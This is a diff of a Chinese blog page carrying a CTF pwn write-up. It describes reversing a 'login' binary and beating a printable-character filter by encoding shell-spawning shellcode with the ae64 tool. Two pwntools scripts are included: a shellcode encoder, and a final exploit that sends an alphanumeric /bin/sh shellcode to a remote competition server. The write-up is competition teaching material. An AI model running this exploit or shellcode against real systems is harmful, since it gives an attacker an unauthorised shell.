@@ -75,7 +75,7 @@
         		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
             	<ul class="sb-submenu">
 				  	
-				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(23)</small></a></li>
+				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(22)</small></a></li>
 				    
 				    <li><a href="/categories/CSAPP-LAB/" class="animsition-link">CSAPP LAB<small>(1)</small></a></li>
 				    
@@ -263,8 +263,7 @@
         </div>
         <div class="col-md-8 col-md-offset-2">
       		
-    <div id="aplayer-gbkqOrWI" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
-
+    <div id="aplayer-dKPAdmyk" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
 <p>好久没有写博客了，水一个，后面两天在写完信号与系统大作业以后预计复现一下另外两道题。这题还是蛮简单的也就是两个点，第一操作符逻辑能不能逆出来，第二能不能第一时间反应这个是可见字符shellcode。调试主要都在逆向阶段了，利用真的没有任何难度。主要可能是别的队pwn手还是少了，不然这个题可能解会超过web。</p>
 <h2><span id="checksec">checksec</span></h2><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-29%20%E4%B8%8B%E5%8D%886.44.34.png" alt="截屏2022-05-29 下午6.44.34"></p>
 <p>libc2.33</p>
@@ -276,15 +275,11 @@
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-29%20%E4%B8%8B%E5%8D%886.49.50.png" alt="截屏2022-05-29 下午6.49.50"></p>
 <p>这里对我们输入的msg字符串进行了过滤，也就是shellcode必须为可见字符串。之前做过类似的题，可以直接使用工具生成。</p>
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-29%20%E4%B8%8B%E5%8D%886.51.22.png" alt="截屏2022-05-29 下午6.51.22"></p>
-<p>这里使用<a target="_blank" rel="noopener" href="https://github.com/veritas501/ae64%E7%9A%84%E5%B7%A5%E5%85%B7%EF%BC%8C%E9%A6%96%E5%85%88%E4%BD%BF%E7%94%A8pwntools%E6%A8%A1%E5%9D%97%E7%94%9F%E6%88%9064%E4%BD%8Dshellcode%EF%BC%8C%E7%84%B6%E5%90%8E">https://github.com/veritas501/ae64的工具，首先使用pwntools模块生成64位shellcode，然后</a></p>
+<p>这里使用<a target="_blank" rel="noopener" href="https://github.com/veritas501/ae64的工具，首先使用pwntools模块生成64位shellcode，然后">https://github.com/veritas501/ae64的工具，首先使用pwntools模块生成64位shellcode，然后</a></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">obj = AE64()</span><br><span class="line">sc = obj.encode(asm(shellcraft.sh()),<span class="string">&#x27;rdx&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(sc)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
 <p>​    即可生成shellcode。</p>
 <p>最后的exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;59.110.24.117&quot;</span>,<span class="number">12587</span>)</span><br><span class="line">payload1 = <span class="string">b&quot;opt:1\nmsg:ro0t\r\n&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,payload1)</span><br><span class="line">shellcode = <span class="string">b&quot;RXWTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZj3TYfi9520t800T810T850T860T870T8A0t8B0T8D0T8E0T8F0T8G0T8H0T8P0t8T0T8YRAPZ0t8J0T8M0T8N0t8Q0t8U0t8WZjUTYfi9200t800T850T8P0T8QRAPZ0t81ZjhHpzbinzzzsPHAghriTTI4qTTTT1vVj8nHTfVHAf1RjnXZP&quot;</span></span><br><span class="line">payload2 = <span class="string">b&quot;opt:2\nmsg:&quot;</span> + shellcode + <span class="string">b&quot;\r\n&quot;</span></span><br><span class="line"><span class="built_in">print</span>(disasm(shellcode))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
 <p>​</p>
 
             <div class="clearfix"></div>
